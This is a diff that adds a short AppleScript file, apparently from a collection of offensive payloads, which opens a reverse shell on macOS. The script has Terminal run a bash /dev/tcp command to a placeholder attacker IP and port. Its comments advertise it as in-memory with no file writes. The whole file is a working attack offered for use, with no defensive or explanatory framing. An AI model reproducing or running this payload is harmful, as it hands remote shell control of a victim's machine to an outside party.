@@ -1,0 +1,11 @@
+-- payloads/mac/osascript/raw.osascript
+
+-- Reverse shell (macOS, 2025 ready)
+-- No file writes, pure in-memory via osascript and TCP
+
+set host to "REPLACE_IP"
+set port to REPLACE_PORT
+
+tell application "Terminal"
+  do script "bash -i >& /dev/tcp/" & host & "/" & port & " 0>&1"
+end tell
